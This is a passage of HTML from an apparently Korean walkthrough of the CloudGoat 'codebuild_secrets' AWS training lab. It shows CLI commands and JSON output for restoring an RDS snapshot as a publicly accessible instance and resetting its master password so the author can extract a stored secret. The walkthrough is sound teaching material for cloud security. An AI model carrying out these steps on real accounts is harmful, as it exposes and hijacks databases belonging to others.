class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"OwnerId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"GroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-08cf0063172ca84b3\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"IpPermissionsEgress\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"IpProtocol\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"-1\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"IpRanges\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"0.0.0.0/0\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Ipv6Ranges\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"PrefixListIds\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"UserIdGroupPairs\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>Public으로 접근할 수 있도록 스냅샷에서 RDS 인스턴스를 생성하는 데 필요한 모든 정보를 수집했습니다.</li>\n<li>스냅샷에서 RDS 인스턴스를 생성해 보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">db<span class=\"token operator\">-</span>subnet<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>name <span class=\"token punctuation\">:</span> cloud<span class=\"token operator\">-</span>goat<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>subnet<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>codebuild_secrets_cgidq5cx1pvldn\nvpc<span class=\"token operator\">-</span>security<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>name <span class=\"token punctuation\">:</span> <span class=\"token string\">\"GroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-08cf0063172ca84b3\"</span><span class=\"token punctuation\">,</span>\n\naws rds restore<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span><span class=\"token keyword\">from</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>snapshot \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>identifier secrets<span class=\"token operator\">-</span>instance \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>snapshot<span class=\"token operator\">-</span>identifier secrets<span class=\"token operator\">-</span>snapshot \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>subnet<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>name cloud<span class=\"token operator\">-</span>goat<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>subnet<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>codebuild_secrets_cgidq5cx1pvldn  \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>publicly<span class=\"token operator\">-</span>accessible \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>vpc<span class=\"token operator\">-</span>security<span class=\"token operator\">-</span>group<span class=\"token operator\">-</span>ids sg<span class=\"token operator\">-</span>08cf0063172ca84b3 \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<ul>\n<li>RDS 스냅 샷을 생성한후 해당 로그를 통해서 필요한 부분을 분석하도록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"DBInstance\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"DBInstanceIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"secrets-instance\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceClass\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db.t2.micro\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"creating\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MasterUsername\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"securedb\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AllocatedStorage\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PreferredBackupWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"05:44-06:14\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"BackupRetentionPeriod\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"VpcSecurityGroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-08cf0063172ca84b3\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"active\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBParameterGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"DBParameterGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"default.postgres9.6\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"ParameterApplyStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"in-sync\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroup\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"DBSubnetGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBSubnetGroupDescription\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"SubnetGroupStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Complete\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bb58f8e0a0abe565\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1b\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bce9dc9a764b6a13\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1a\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PreferredMaintenanceWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"fri:04:45-fri:05:15\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PendingModifiedValues\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MultiAZ\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"EngineVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"9.6.22\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AutoMinorVersionUpgrade\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"ReadReplicaDBInstanceIdentifiers\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"LicenseModel\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgresql-license\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"OptionGroupMemberships\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"OptionGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"default:postgres-9-6\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"pending-apply\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PubliclyAccessible\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"StorageType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"gp2\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DbInstancePort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"StorageEncrypted\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DbiResourceId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db-HJPNEAUX3WEQDCJQVIVYK4NWLI\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CACertificateIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rds-ca-2019\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DomainMemberships\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CopyTagsToSnapshot\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MonitoringInterval\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:rds:us-east-1:&lt;USERID>:db:secrets-instance\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"IAMDatabaseAuthenticationEnabled\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PerformanceInsightsEnabled\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DeletionProtection\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AssociatedRoles\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"TagList\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-codebuild_secrets_cgidq5cx1pvldn\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"codebuild-secrets\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CustomerOwnedIpEnabled\"</span><span class=\"token punctuation\">:</span> false\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>이제 마음대로 조절가능한 RDS 인스턴스가 생겼으니 해당 데이터베이스의 마스터 사용자 암호를 재설정하겠습니다. 분석하기 편하게 cloudgoat로 지정을 하도록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds modify<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>identifier secrets<span class=\"token operator\">-</span>instance \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>master<span class=\"token operator\">-</span>user<span class=\"token operator\">-</span>password cloudgoat \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"DBInstance\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"DBInstanceIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"secrets-instance\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceClass\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db.t2.micro\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"available\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MasterUsername\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"securedb\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Endpoint\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Address\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"secrets-instance.cklw91kahwum.us-east-1.rds.amazonaws.com\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Port\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"HostedZoneId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Z2R2ITUGPM61AM\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AllocatedStorage\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"InstanceCreateTime\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T18:40:41.128000+00:00\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PreferredBackupWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"05:44-06:14\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"BackupRetentionPeriod\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"VpcSecurityGroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-08cf0063172ca84b3\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"active\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBParameterGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"DBParameterGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"default.postgres9.6\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"ParameterApplyStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"in-sync\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1a\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroup\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"DBSubnetGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBSubnetGroupDescription\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"SubnetGroupStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Complete\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bb58f8e0a0abe565\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1b\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bce9dc9a764b6a13\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1a\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PreferredMaintenanceWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"fri:04:45-fri:05:15\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PendingModifiedValues\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"MasterUserPassword\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"****\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MultiAZ\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"EngineVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"9.6.22\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AutoMinorVersionUpgrade\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"ReadReplicaDBInstanceIdentifiers\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"LicenseModel\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgresql-license\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"OptionGroupMemberships\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"OptionGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"default:postgres-9-6\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"in-sync\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PubliclyAccessible\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"StorageType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"gp2\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DbInstancePort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"StorageEncrypted\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DbiResourceId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db-HJPNEAUX3WEQDCJQVIVYK4NWLI\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CACertificateIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rds-ca-2019\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DomainMemberships\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CopyTagsToSnapshot\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MonitoringInterval\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:rds:us-east-1:&lt;USERID>:db:secrets-instance\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"IAMDatabaseAuthenticationEnabled\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PerformanceInsightsEnabled\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DeletionProtection\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AssociatedRoles\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"TagList\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-codebuild_secrets_cgidq5cx1pvldn\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"codebuild-secrets\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"CustomerOwnedIpEnabled\"</span><span class=\"token punctuation\">:</span> false\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>마스터 사용자 암호를 설정한 후에 데이터베이스에 연결하고 Security String을 추출하기 위해 필요한 새로운 RDS 인스턴스에 대한 정보를 검색하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.22222222222222%; position: relative; 